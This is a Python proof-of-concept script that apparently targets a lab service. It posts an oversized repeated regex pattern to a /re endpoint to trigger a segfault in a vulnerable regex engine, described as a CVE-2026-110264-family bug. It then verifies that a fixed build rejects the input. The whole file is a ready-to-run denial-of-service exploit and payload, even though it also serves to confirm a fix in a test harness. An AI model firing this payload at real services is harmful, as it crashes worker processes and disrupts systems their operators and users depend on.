#!/usr/bin/env python3
"""regex2shell deterministic interpreter kill (CVE-2026-110264 family).

Fires a match against a compiled program whose OP_REPEAT IDs have wrapped
past the 16-bit ID space: on the vulnerable build the repeat-stack aliasing
makes re.match segfault with a native [BUG] report (SIGSEGV); on the fixed
build the same input is rejected at compile time with RegexpError and the
service keeps serving.

The kill lands in a disposable child process (the lab's per-request worker
analog of a Puma worker); the harness itself must survive every round.

Usage:
  python3 poc/crash.py [--host 127.0.0.1] [--port 29565] [--rounds 3]
                       [--check-fixed]
"""
import argparse
import json
import sys
import urllib.request

PATTERN_UNITS = 100000   # IDs >= 65536 alias live IDs -> deterministic kill
SUBJECT = "foobar" * 6


def post(host, port, route, body, timeout=180):
    data = body.encode() if isinstance(body, str) else json.dumps(body).encode()
    req = urllib.request.Request(f"http://{host}:{port}{route}", data=data, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.load(resp)


def kill_payload():
    return {"pattern": "(?:foobar){0,100}" * PATTERN_UNITS,
            "match": True, "subject": SUBJECT}


def health(host, port):
    r = post(host, port, "/render", "* alive\n")
    return r["verdict"], (r.get("stdout") or "")[:40]


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=29565)
    ap.add_argument("--rounds", type=int, default=3)
    ap.add_argument("--check-fixed", action="store_true",
                    help="also fire the identical attack at :29566-style fixed build")
    args = ap.parse_args()

    print(f"regex2shell deterministic kill -> {args.host}:{args.port} "
          f"({args.rounds} rounds)")
    kills = bugs = 0
    for i in range(1, args.rounds + 1):
        r = post(args.host, args.port, "/re", kill_payload())
        ok = r["verdict"] == "CRASH" and r.get("signal") == 11 and r.get("bug")
        kills += ok
        bugs += bool(r.get("bug"))
        print(f"  round {i}: verdict={r['verdict']} signal={r.get('signal')} "
              f"[BUG]={r.get('bug')} {r['elapsed_ms']}ms {'KILL' if ok else 'NO-KILL'}")
    v, out = health(args.host, args.port)
    print(f"  harness health after kills: {v} {out!r}")
    healthy = v == "OK"

    fixed_ok = True
    if args.check_fixed:
        port = 29566 if args.port == 29565 else args.port + 1
        print(f"  fixed-build control -> {args.host}:{port}")
        for i in range(1, args.rounds + 1):
            r = post(args.host, port, "/re", kill_payload())
            survived = r["verdict"] == "REGEXP_ERROR" and not r.get("bug")
            fixed_ok &= survived
            print(f"  fixed round {i}: verdict={r['verdict']} "
                  f"{'SURVIVES (clean RegexpError)' if survived else 'UNEXPECTED'}")
        v, _ = health(args.host, port)
        fixed_ok &= v == "OK"
        print(f"  fixed harness health: {v}")

    if kills == args.rounds and bugs == args.rounds and healthy and fixed_ok:
        print(f"RESULT: {kills}/{args.rounds} deterministic [BUG] kills, "
              "harness alive" + (", fixed build survives identical attack" if args.check_fixed else ""))
        return 0
    print("RESULT: FAILED — see rounds above")
    return 1


if __name__ == "__main__":
    sys.exit(main())
